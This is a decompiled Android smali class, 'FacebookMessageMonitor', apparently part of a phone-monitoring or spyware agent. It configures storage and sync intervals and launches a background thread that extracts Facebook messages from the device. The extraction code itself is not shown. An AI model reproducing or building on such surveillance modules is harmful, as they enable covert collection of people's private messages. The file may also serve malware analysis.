.class public Lcom/hp/vd/module/monitor/FacebookMessageMonitor;
.super Lcom/hp/vd/module/ModuleAbstract;
.source "FacebookMessageMonitor.java"


# static fields
.field public static final ATTRIBUTE_MAX_READ_PER_ITERATION:Ljava/lang/String; = "500"

.field public static final ATTRIBUTE_MAX_TIME:Ljava/lang/String; = "max_time"

.field public static final ATTRIBUTE_SYNCHRONIZATION_INTERVAL:Ljava/lang/String; = "synchronization_interval"

.field protected static final TAG:Ljava/lang/String; = "FbMsgMon"


# instance fields
.field protected extractorThread:Ljava/lang/Thread;

.field protected facebookMessageDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/FacebookMessageData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected lastSynchronization:Ljava/lang/Long;

.field protected moduleData:Lcom/hp/vd/data/ModuleData;


# direct methods
.method public constructor <init>()V
    .locals 1

    .line 44
    invoke-direct {p0}, Lcom/hp/vd/module/ModuleAbstract;-><init>()V

    const/4 v0, 0x0

    .line 52
    iput-object v0, p0, Lcom/hp/vd/module/monitor/FacebookMessageMonitor;->facebookMessageDao:Lcom/j256/ormlite/dao/Dao;

    .line 53
    iput-object v0, p0, Lcom/hp/vd/module/monitor/FacebookMessageMonitor;->extractorThread:Ljava/lang/Thread;

    .line 54
    iput-object v0, p0, Lcom/hp/vd/module/monitor/FacebookMessageMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 55
    iput-object v0, p0, Lcom/hp/vd/module/monitor/FacebookMessageMonitor;->lastSynchronization:Ljava/lang/Long;

    return-void
.end method


# virtual methods
.method public deinitialize()Z
    .locals 1

    .line 140
    iget-object v0, p0, Lcom/hp/vd/module/monitor/FacebookMessageMonitor;->facebookMessageDao:Lcom/j256/ormlite/dao/Dao;

    if-eqz v0, :cond_0

    const/4 v0, 0x0

    .line 141
    iput-object v0, p0, Lcom/hp/vd/module/monitor/FacebookMessageMonitor;->facebookMessageDao:Lcom/j256/ormlite/dao/Dao;

    :cond_0
    const/4 v0, 0x1

    return v0
.end method

.method public getDataClass()Ljava/lang/Class;
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()",
            "Ljava/lang/Class<",
            "*>;"
        }
    .end annotation

    .line 61
    const-class v0, Lcom/hp/vd/data/FacebookMessageData;

    return-object v0
.end method

.method public getModuleData()Lcom/hp/vd/data/ModuleData;
    .locals 3

    .line 78
    new-instance v0, Lcom/hp/vd/data/ModuleData;

    invoke-direct {v0}, Lcom/hp/vd/data/ModuleData;-><init>()V

    const-string v1, "monitor"

    .line 80
    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->type:Ljava/lang/String;

    .line 81
    sget-object v1, Lcom/hp/vd/module/Constants;->STATUS_ACTIVE:Ljava/lang/Integer;

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->status:Ljava/lang/Integer;

    .line 82
    invoke-virtual {p0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->packageName:Ljava/lang/String;

    .line 83
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/FacebookMessageMonitor;->getModuleName()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->name:Ljava/lang/String;

    const/4 v1, 0x4

    .line 84
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->version:Ljava/lang/Integer;

    const-string v1, "v4.0"

    .line 85
    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->versionCodename:Ljava/lang/String;

    const-string v1, "data"

    const-string v2, "text"

    .line 87
    invoke-virtual {v0, v1, v2}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    const-string v1, "max_time"

    const-string v2, "0"

    .line 91
    invoke-virtual {v0, v1, v2}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    const-string v1, "synchronization_interval"

    const-string v2, "870"

    .line 92
    invoke-virtual {v0, v1, v2}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    const/16 v1, 0x11

    .line 94
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    iput-object v2, v0, Lcom/hp/vd/data/ModuleData;->priorityLoad:Ljava/lang/Integer;

    .line 95
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->prioritySynchronization:Ljava/lang/Integer;

    .line 97
    sget-object v1, Lcom/hp/vd/module/Constants;->EXTERNAL_MODULE:Ljava/lang/Integer;

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->internal:Ljava/lang/Integer;

    return-object v0
.end method

.method public getModuleName()Ljava/lang/String;
    .locals 1

    const-string v0, "FacebookMessageMonitor"

    return-object v0
.end method

.method protected hasUpdateIntervalExpired()Z
    .locals 9

    .line 214
    iget-object v0, p0, Lcom/hp/vd/module/monitor/FacebookMessageMonitor;->lastSynchronization:Ljava/lang/Long;

    .line 215
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v1

    const-wide/16 v3, 0x3e8

    div-long/2addr v1, v3

    invoke-static {v1, v2}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v1

    .line 216
    iget-object v2, p0, Lcom/hp/vd/module/monitor/FacebookMessageMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v3, "synchronization_interval"

    invoke-virtual {v2, v3}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v2

    if-eqz v0, :cond_0

    .line 218
    invoke-virtual {v1}, Ljava/lang/Long;->longValue()J

    move-result-wide v3

    invoke-virtual {v0}, Ljava/lang/Long;->longValue()J

    move-result-wide v5

    sub-long v7, v3, v5

    int-to-long v2, v2

    cmp-long v0, v7, v2

    if-gez v0, :cond_0

    const/4 v0, 0x1

    return v0

    .line 222
    :cond_0
    iput-object v1, p0, Lcom/hp/vd/module/monitor/FacebookMessageMonitor;->lastSynchronization:Ljava/lang/Long;

    const/4 v0, 0x0

    return v0
.end method

.method public initialize()Z
    .locals 5

    .line 105
    iget-object v0, p0, Lcom/hp/vd/module/monitor/FacebookMessageMonitor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    const/4 v1, 0x0

    .line 108
    :try_start_0
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/FacebookMessageMonitor;->getDao()Lcom/j256/ormlite/dao/Dao;

    move-result-object v2

    iput-object v2, p0, Lcom/hp/vd/module/monitor/FacebookMessageMonitor;->facebookMessageDao:Lcom/j256/ormlite/dao/Dao;
    :try_end_0
    .catch Ljava/sql/SQLException; {:try_start_0 .. :try_end_0} :catch_2
    .catch Ljava/lang/NullPointerException; {:try_start_0 .. :try_end_0} :catch_1

    .line 122
    :try_start_1
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/FacebookMessageMonitor;->getPersistedModuleData()Lcom/hp/vd/data/ModuleData;

    move-result-object v1

    iput-object v1, p0, Lcom/hp/vd/module/monitor/FacebookMessageMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_0

    :catch_0
    move-exception v1

    const-string v2, "FbMsgMon"

    const-string v3, "initialize(): could not load persisted module data."

    .line 125
    invoke-interface {v0, v2, v3, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    :goto_0
    const/4 v0, 0x1

    return v0

    :catch_1
    move-exception v2

    const-string v3, "FbMsgMon"

    const-string v4, "NullPointerException caught while initializing"

    .line 116
    invoke-interface {v0, v3, v4, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return v1

    :catch_2
    move-exception v2

    const-string v3, "FbMsgMon"

    const-string v4, "Could not create Dao."

    .line 111
    invoke-interface {v0, v3, v4, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return v1
.end method

.method public install(Ljava/lang/String;)Z
    .locals 0

    .line 67
    invoke-super {p0, p1}, Lcom/hp/vd/module/ModuleAbstract;->install(Ljava/lang/String;)Z

    move-result p1

    if-nez p1, :cond_0

    const/4 p1, 0x0

    return p1

    :cond_0
    const/16 p1, 0x96

    .line 71
    invoke-static {p1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object p1

    invoke-virtual {p0, p1}, Lcom/hp/vd/module/monitor/FacebookMessageMonitor;->setDataReadLimit(Ljava/lang/Integer;)Z

    const/4 p1, 0x1

    return p1
.end method

.method public isStarted()Z
    .locals 1

    .line 205
    iget-object v0, p0, Lcom/hp/vd/module/monitor/FacebookMessageMonitor;->extractorThread:Ljava/lang/Thread;

    if-nez v0, :cond_0

    const/4 v0, 0x0

    return v0

    .line 209
    :cond_0
    iget-object v0, p0, Lcom/hp/vd/module/monitor/FacebookMessageMonitor;->extractorThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->isAlive()Z

    move-result v0

    return v0
.end method

.method public start()Z
    .locals 6

    .line 160
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/FacebookMessageMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    const-string v1, "FbMsgMon"

    const-string v2, "start() called."

    .line 161
    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 163
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/FacebookMessageMonitor;->isActivated()Z

    move-result v1

    const/4 v2, 0x0

    if-nez v1, :cond_0

    const-string v1, "FbMsgMon"

    const-string v3, "start(): This module is currently DEactivated."

    .line 164
    invoke-interface {v0, v1, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    return v2

    .line 169
    :cond_0
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/FacebookMessageMonitor;->hasUpdateIntervalExpired()Z

    move-result v1

    const/4 v3, 0x1

    if-ne v1, v3, :cond_1

    return v3

    .line 173
    :cond_1
    iget-object v1, p0, Lcom/hp/vd/module/monitor/FacebookMessageMonitor;->extractorThread:Ljava/lang/Thread;

    if-eqz v1, :cond_2

    iget-object v1, p0, Lcom/hp/vd/module/monitor/FacebookMessageMonitor;->extractorThread:Ljava/lang/Thread;

    invoke-virtual {v1}, Ljava/lang/Thread;->isAlive()Z

    move-result v1

    if-eqz v1, :cond_2

    const-string v1, "FbMsgMon"

    const-string v4, "start(): Extractor thread is currently running. Exiting..."

    .line 174
    invoke-interface {v0, v1, v4, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return v2

    .line 179
    :cond_2
    new-instance v1, Lcom/hp/vd/module/monitor/facebook/FacebookMessageExtractor;

    .line 180
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/FacebookMessageMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v2

    iget-object v4, p0, Lcom/hp/vd/module/monitor/FacebookMessageMonitor;->facebookMessageDao:Lcom/j256/ormlite/dao/Dao;

    iget-object v5, p0, Lcom/hp/vd/module/monitor/FacebookMessageMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-direct {v1, v2, v4, v5, v0}, Lcom/hp/vd/module/monitor/facebook/FacebookMessageExtractor;-><init>(Lcom/hp/vd/context/Context;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/agent/log/IWriter;)V

    .line 186
    new-instance v0, Ljava/lang/Thread;

    const-string v2, "Facebook-Message-Extractor-Thread"

    invoke-direct {v0, v1, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    iput-object v0, p0, Lcom/hp/vd/module/monitor/FacebookMessageMonitor;->extractorThread:Ljava/lang/Thread;

    .line 187
    iget-object v0, p0, Lcom/hp/vd/module/monitor/FacebookMessageMonitor;->extractorThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return v3
.end method

.method public startOnHeartbeat()Z
    .locals 1

    .line 150
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/FacebookMessageMonitor;->isActivated()Z

    move-result v0

    if-nez v0, :cond_0

    const/4 v0, 0x0

    return v0

    :cond_0
    const/4 v0, 0x1

    return v0
.end method

.method public stop()Z
    .locals 1

    .line 195
    iget-object v0, p0, Lcom/hp/vd/module/monitor/FacebookMessageMonitor;->extractorThread:Ljava/lang/Thread;

    if-eqz v0, :cond_0

    .line 196
    iget-object v0, p0, Lcom/hp/vd/module/monitor/FacebookMessageMonitor;->extractorThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->interrupt()V

    :cond_0
    const/4 v0, 0x1

    return v0
.end method
